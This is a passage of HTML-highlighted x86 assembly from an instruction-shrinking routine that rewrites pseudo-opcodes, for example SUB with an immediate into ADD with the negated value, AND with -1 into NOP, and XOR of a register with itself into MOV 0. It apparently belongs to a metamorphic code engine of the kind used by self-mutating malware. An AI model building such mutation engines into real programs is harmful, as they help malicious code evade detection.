                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; If they are, set NOP</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">
      </span><span class="sc5">@@Single_SetNOP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
      </span><span class="sc5">@@Single_SetInstruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the DWORD at [EDI]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; Set 0FF on the lower byte (set NOP)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Write back the DWORD</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">

      </span><span class="sc5">@@Single_Next04</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; MOV Reg8,Reg8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CommonMOV</span><span class="sc0">

      </span><span class="sc5">@@Single_Next05</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">        </span><span class="sc1">; SUB Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next06</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Just put ADD</span><span class="sc0">
      </span><span class="sc5">@@Single_Next_NegateImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Negate the Imm</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstructionECX</span><span class="sc0"> </span><span class="sc1">; Set the opcode of ADD</span><span class="sc0">

      </span><span class="sc5">@@Single_Next06</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; SUB Reg8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next07</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; Set the opcode of ADD Reg8,Imm8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_NegateImm</span><span class="sc0"> </span><span class="sc1">; Jump to negate the Imm</span><span class="sc0">

      </span><span class="sc5">@@Single_Next07</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">       </span><span class="sc1">; SUB Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next08</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; Set ADD Mem,-Imm</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_NegateImm</span><span class="sc0">

      </span><span class="sc5">@@Single_Next08</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; SUB Mem8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next09</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; Set ADD Mem8,-Imm8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_NegateImm</span><span class="sc0">

      </span><span class="sc5">@@Single_Next09</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; ADD Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next10</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_CheckNulOP_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check if it's ADD Reg,0. If it is,</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_CheckNulOP</span><span class="sc0">  </span><span class="sc1">; anulate the instruction</span><span class="sc0">

      </span><span class="sc5">@@Single_Next10</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                      </span><span class="sc1">; ADD Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckNulOP_2</span><span class="sc0"> </span><span class="sc1">; If it is, check for Imm==0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">; ADD Mem8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckNulOP_2_8b</span><span class="sc0"> </span><span class="sc1">; Check for Imm8 == 0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">                    </span><span class="sc1">; OR Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckNulOP_2</span><span class="sc0">    </span><span class="sc1">; Check for Imm == 0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">                </span><span class="sc1">; OR Mem8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckNulOP_2_8b</span><span class="sc0"> </span><span class="sc1">; Check for Imm8 == 0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">               </span><span class="sc1">; AND Mem8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next10_Check_s1_8b</span><span class="sc0">  </span><span class="sc1">; Check for Imm8 == -1 or 0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc0">                   </span><span class="sc1">; AND Mem,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next10_</span><span class="sc0">             </span><span class="sc1">; Check for Imm == -1 or 0</span><span class="sc0">
        </span><span class="sc5">@@Single_Next10_Check_s1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get Imm</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_SetNOP</span><span class="sc0">  </span><span class="sc1">; If Imm == -1, set NOP</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">     </span><span class="sc1">; If Imm == 0,</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">       </span><span class="sc1">;  set MOV Mem,0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">
        </span><span class="sc5">@@Single_Next10_Check_s1_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; Check if Imm8 == -1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_SetNOP</span><span class="sc0"> </span><span class="sc1">; If it is, set NOP</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Check if Imm8 == 0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">    </span><span class="sc1">; If it isn't, check doubles</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">  </span><span class="sc1">; Set MOV Mem8,0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">


      </span><span class="sc5">@@Single_Next10_</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; ADD Reg8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next11</span><span class="sc0">
        </span><span class="sc5">@@Single_Next_CheckNulOP_2_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;xor     eax, eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the Imm and go to check if it's 0</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_CheckNulOP</span><span class="sc0">

      </span><span class="sc5">@@Single_Next11</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; OR Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckNulOP_2</span><span class="sc0">  </span><span class="sc1">; Check if Imm is 0</span><span class="sc0">

      </span><span class="sc5">@@Single_Next12</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; OR Reg8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckNulOP_2_8b</span><span class="sc0">  </span><span class="sc1">; Check if is 0</span><span class="sc0">

      </span><span class="sc5">@@Single_Next13</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">       </span><span class="sc1">; AND Reg,Imm?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next14</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check if Imm == -1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_SetNOP</span><span class="sc0">  </span><span class="sc1">; If it is, set NOP</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; If it's 0, set MOV Reg,0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Single_Next14</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; AND Reg8,Imm8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next15</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get Imm8</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; Check if it's -1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_SetNOP</span><span class="sc0">  </span><span class="sc1">; If it is, set NOP</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">     </span><span class="sc1">; Check if it's 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; If it is, set MOV Reg,0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstruction</span><span class="sc0">

      </span><span class="sc5">@@Single_Next15</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc0">       </span><span class="sc1">; XOR Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next16</span><span class="sc0">
      </span><span class="sc5">@@Single_Next_CheckSetTo0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; Set ECX = pseudoopcode of MOV</span><span class="sc0">
      </span><span class="sc5">@@Single_Next_CheckSetTo0_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check if source == destiny</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; If they are equal...</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_End</span><span class="sc0">     </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; ...set MOV Reg,0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_SetInstructionECX</span><span class="sc0">

      </span><span class="sc5">@@Single_Next16</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; XOR Reg8,Reg8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next17</span><span class="sc0">
      </span><span class="sc5">@@Single_Next_CheckSetTo0_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; Check if source == destiny and put</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_CheckSetTo0_2</span><span class="sc0"> </span><span class="sc1">; MOV Reg8,0 if they are</span><span class="sc0">
                                                  </span><span class="sc1">; equal</span><span class="sc0">
      </span><span class="sc5">@@Single_Next17</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc0">       </span><span class="sc1">; SUB Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckSetTo0</span><span class="sc0"> </span><span class="sc1">; Check in the same way as</span><span class="sc0">
                                                </span><span class="sc1">; XOR Reg,Reg</span><span class="sc0">
      </span><span class="sc5">@@Single_Next18</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; SUB Reg8,Reg8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckSetTo0_8b</span><span class="sc0">  </span><span class="sc1">; Check if src == dest, to</span><span class="sc0">
                                                    </span><span class="sc1">; see if we put MOV Reg8,0</span><span class="sc0">

      </span><span class="sc5">@@Single_Next19</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">       </span><span class="sc1">; OR Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next20</span><span class="sc0">
      </span><span class="sc5">@@Single_Next_CheckCheckIf0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Put CMP Reg,0 if src == dest</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_CheckSetTo0_2</span><span class="sc0">

      </span><span class="sc5">@@Single_Next20</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; OR Reg8,Reg8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Single_Next21</span><span class="sc0">
      </span><span class="sc5">@@Single_Next_CheckCheckIf0_8b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; Put CMP Reg8,0 if src == dest</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Single_Next_CheckSetTo0_2</span><span class="sc0">

      </span><span class="sc5">@@Single_Next21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">       </span><span class="sc1">; AND Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckCheckIf0</span><span class="sc0">

      </span><span class="sc5">@@Single_Next22</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; AND Reg8,Reg8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckCheckIf0_8b</span><span class="sc0">

      </span><span class="sc5">@@Single_Next23</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc0">       </span><span class="sc1">; TEST Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckCheckIf0</span><span class="sc0">

      </span><span class="sc5">@@Single_Next24</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; TEST Reg8,Reg8?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Single_Next_CheckCheckIf0_8b</span><span class="sc0">

      </span><span class="sc5">@@Single_Next25</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;mov     al, [edi]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">      </span><span class="sc1">; LEA Reg,[Mem]?</span><span class="sc0">
